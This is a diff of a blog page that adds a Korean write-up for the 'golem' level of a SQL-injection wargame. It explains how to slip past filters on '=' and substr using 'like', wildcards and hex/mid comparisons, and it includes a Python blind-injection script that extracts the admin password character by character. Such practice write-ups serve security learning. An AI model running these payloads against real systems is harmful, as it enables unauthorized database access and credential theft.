@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Wargame,los," />
 
 
 
@@ -79,13 +79,27 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Mode5ty">
-<meta property="og:url" content="http://modesty.kr/archives/2017/page/3/index.html">
+<meta name="description" content="golem 필터링에서 substr과 = 이 추가되었다. 기본적인 인젝션을 하니 guest가 나오지만 admin의 pw를 찾아야한다.||id=’admin’을 입력하게되면 필터링에 걸리게 된다 =을 우회해야하는데 =을 우회할수 있는 키워드는 like이다.pw의 길이가 매번(?) 8글자인것같아서 혹시나 하고 게싱 했는데 맞았다 이제 pw를 뽑아오기위해 blind">
+<meta name="keywords" content="Wargame,los">
+<meta property="og:type" content="article">
+<meta property="og:title" content="golem">
+<meta property="og:url" content="http://modesty.kr/2019/03/11/Writeup/los/golem/index.html">
 <meta property="og:site_name" content="Mode5ty">
+<meta property="og:description" content="golem 필터링에서 substr과 = 이 추가되었다. 기본적인 인젝션을 하니 guest가 나오지만 admin의 pw를 찾아야한다.||id=’admin’을 입력하게되면 필터링에 걸리게 된다 =을 우회해야하는데 =을 우회할수 있는 키워드는 like이다.pw의 길이가 매번(?) 8글자인것같아서 혹시나 하고 게싱 했는데 맞았다 이제 pw를 뽑아오기위해 blind">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104895-c19f7b80-4414-11e9-8f06-1f935107bd9b.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104897-c19f7b80-4414-11e9-95e9-aedb3881c699.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104898-c2381200-4414-11e9-9b68-b50f25c0a08b.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104899-c2381200-4414-11e9-8828-8f428177eb2c.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104925-d11ec480-4414-11e9-93ba-b8384e8d358b.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104930-d3811e80-4414-11e9-8cc8-8ad314df805a.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104938-d4b24b80-4414-11e9-80e9-d18bd76eb5fa.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40205791/54104941-d5e37880-4414-11e9-86b0-ef04d5a1aea5.jpg">
+<meta property="og:updated_time" content="2019-03-11T06:53:26.004Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mode5ty">
+<meta name="twitter:title" content="golem">
+<meta name="twitter:description" content="golem 필터링에서 substr과 = 이 추가되었다. 기본적인 인젝션을 하니 guest가 나오지만 admin의 pw를 찾아야한다.||id=’admin’을 입력하게되면 필터링에 걸리게 된다 =을 우회해야하는데 =을 우회할수 있는 키워드는 like이다.pw의 길이가 매번(?) 8글자인것같아서 혹시나 하고 게싱 했는데 맞았다 이제 pw를 뽑아오기위해 blind">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/40205791/54104895-c19f7b80-4414-11e9-8f06-1f935107bd9b.jpg">
 
 
 
@@ -115,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://modesty.kr/archives/2017/page/3/"/>
+  <link rel="canonical" href="http://modesty.kr/2019/03/11/Writeup/los/golem/"/>
 
 
 
 
 
-  <title>Archive | Mode5ty</title>
+  <title>golem | Mode5ty</title>
   
 
 
@@ -140,7 +154,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -268,373 +282,213 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
 
-      <span class="archive-page-counter">
-        
-        
-         
-        
-        OK! 40 posts in total. Keep on posting.
-      </span>
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://modesty.kr/2019/03/11/Writeup/los/golem/">
 
-      
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mode5ty">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mode5ty">
+    </span>
+
+    
+      <header class="post-header">
 
         
         
+          <h1 class="post-title" itemprop="name headline">golem</h1>
         
 
-        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-11T15:53:26+09:00">
+                2019-03-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2017">2017</h1>
-          </div>
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/29/Writeup/los/vampire/" itemprop="url">
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
               
-                <span itemprop="name">vampire</span>
+                <span class="post-meta-item-text">In</span>
               
-            </a>
-        
-      </h2>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">Writeup</span>
+                  </a>
+                </span>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-29T14:37:00+09:00"
-              content="2017-11-29" >
-          11-29
-        </time>
-      </div>
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Writeup/Load-of-SQL-injection/" itemprop="url" rel="index">
+                    <span itemprop="name">Load of SQL injection</span>
+                  </a>
+                </span>
 
-    </header>
-  </article>
+                
+                
+              
+            </span>
+          
 
 
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/29/Writeup/los/troll/" itemprop="url">
-              
-                <span itemprop="name">troll</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-29T14:34:00+09:00"
-              content="2017-11-29" >
-          11-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/29/Writeup/los/orge/" itemprop="url">
-              
-                <span itemprop="name">orge</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-29T14:30:00+09:00"
-              content="2017-11-29" >
-          11-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+      
+        <p><div style="text-align:center"><br><strong>golem</strong></div></p>
+<p></p><p><br><img src="https://user-images.githubusercontent.com/40205791/54104895-c19f7b80-4414-11e9-8f06-1f935107bd9b.jpg" alt="1"><br>필터링에서 substr과 = 이 추가되었다. 기본적인 인젝션을 하니 guest가 나오지만 admin의 pw를 찾아야한다.<br><img src="https://user-images.githubusercontent.com/40205791/54104897-c19f7b80-4414-11e9-95e9-aedb3881c699.jpg" alt="2"><br>||id=’admin’을 입력하게되면 필터링에 걸리게 된다 =을 우회해야하는데 =을 우회할수 있는 키워드는 like이다.<br><img src="https://user-images.githubusercontent.com/40205791/54104898-c2381200-4414-11e9-9b68-b50f25c0a08b.jpg" alt="3"><br>pw의 길이가 매번(?) 8글자인것같아서 혹시나 하고 게싱 했는데 맞았다 이제 pw를 뽑아오기위해 blind를 이용해야하는데 substr이 필터링이다. substr을 우회하는 방법은 여러가지가 있지만 wildcard로 pw를 뽑아야 겠다.<br><img src="https://user-images.githubusercontent.com/40205791/54104899-c2381200-4414-11e9-8828-8f428177eb2c.jpg" alt="4"><br>wildcard란 %를 이용해서 pw를 찾는 방법인데 뒤에 글자에 상관없이 내가 입력한 값이 실제 테이블에 있는 값과 위치만 맞으면 참 거짓을 판별한다.<br><img src="https://user-images.githubusercontent.com/40205791/54104925-d11ec480-4414-11e9-93ba-b8384e8d358b.jpg" alt="5"><br>8%를 하니까 참이 나왔다. 즉, pw의 첫번째 값은 8이고 다음값을 찾을때는 값을 하나씩 늘려주면서 찾으면 된다.<br><img src="https://user-images.githubusercontent.com/40205791/54104930-d3811e80-4414-11e9-8cc8-8ad314df805a.jpg" alt="6"><br>81%이런식으로 늘려가면서 찾으면되고 맨 앞자리는 맞았는데 두 번째 값이 다르기 때문에 참이 나오지않는 것이다.<br><img src="https://user-images.githubusercontent.com/40205791/54104938-d4b24b80-4414-11e9-80e9-d18bd76eb5fa.jpg" alt="7"><br>두번째 값도 8이다.<br><img src="https://user-images.githubusercontent.com/40205791/54104941-d5e37880-4414-11e9-86b0-ef04d5a1aea5.jpg" alt="8"><br>Clear</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">import urllib2</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[*] Password length Search"</span></span><br><span class="line"><span class="keyword">for</span> len <span class="keyword">in</span> range(1,100):</span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=1%27||length(pw) like "</span>+str(len)+<span class="string">"%23"</span></span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        req = urllib2.Request(url)</span><br><span class="line">        <span class="comment">#req=urllib2.Request(url, headers=&#123;'User-Agent':'Mozilla/5.0'&#125;)</span></span><br><span class="line">        req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=rj7lh0huq2jbjscih7usk3eut1"</span>)</span><br><span class="line">        req.add_header(<span class="string">"User-Agent"</span>, <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>)</span><br><span class="line">        response = urllib2.urlopen(req).<span class="built_in">read</span>()</span><br><span class="line">        <span class="keyword">if</span> response.find(<span class="string">"Hello admin"</span>) != -1:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">"[*] Password length : %s"</span> % (len)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[*] Password Value Search"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,len+1): <span class="comment">#len+1로해야 해당길이만큼 검색함 예를들어 8이면 1~7범위까지다.</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(1,200):</span><br><span class="line">        url2 = <span class="string">"http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=1%27||id%0dregexp%0d%22^admi%22%0d%26%26hex(mid(pw,"</span>+str(i)+<span class="string">",1))%0din%0d(hex("</span>+str(j)+<span class="string">"))"</span>+<span class="string">"%23"</span></span><br><span class="line">        <span class="built_in">print</span> url2</span><br><span class="line">        req = urllib2.Request(url2)</span><br><span class="line">        <span class="comment">#req=urllib2.Request(url2, headers=&#123;"Cookie","PHPSESSID=rj7lh0huq2jbjscih7usk3eut1",'User-Agent':'Mozilla/5.0'&#125;)</span></span><br><span class="line">        req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=rj7lh0huq2jbjscih7usk3eut1"</span>)</span><br><span class="line">        req.add_header(<span class="string">"User-Agent"</span>, <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>)</span><br><span class="line">        response = urllib2.urlopen(req).<span class="built_in">read</span>()</span><br><span class="line">        <span class="keyword">if</span> response.find(<span class="string">"Hello admin"</span>) != -1:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">"[*] Password : "</span> + flag</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/29/Writeup/los/darkelf/" itemprop="url">
-              
-                <span itemprop="name">drakelf</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-29T11:02:00+09:00"
-              content="2017-11-29" >
-          11-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/29/Writeup/los/wolfman/" itemprop="url">
-              
-                <span itemprop="name">wolfman</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-29T10:59:00+09:00"
-              content="2017-11-29" >
-          11-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/28/Writeup/los/orc/" itemprop="url">
-              
-                <span itemprop="name">orc</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-28T16:57:00+09:00"
-              content="2017-11-28" >
-          11-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/28/Writeup/los/goblin/" itemprop="url">
-              
-                <span itemprop="name">goblin</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-28T16:37:00+09:00"
-              content="2017-11-28" >
-          11-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/28/Writeup/los/cobolt/" itemprop="url">
-              
-                <span itemprop="name">cobolt</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-28T16:33:00+09:00"
-              content="2017-11-28" >
-          11-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/28/Writeup/los/gremlin/" itemprop="url">
-              
-                <span itemprop="name">gremlin</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-28T16:27:00+09:00"
-              content="2017-11-28" >
-          11-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Wargame/" rel="tag"># Wargame</a>
+          
+            <a href="/tags/los/" rel="tag"># los</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/29/Writeup/codeengn/basic03/" rel="next" title="basic03">
+                <i class="fa fa-chevron-left"></i> basic03
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+<!-- disqus page -->
+
+
+
+<h2> 댓글 남기기</h2>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://younghok1m-github-io.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2017/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/archives/2017/">1</a><a class="page-number" href="/archives/2017/page/2/">2</a><span class="page-number current">3</span>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -642,6 +496,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -857,6 +715,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
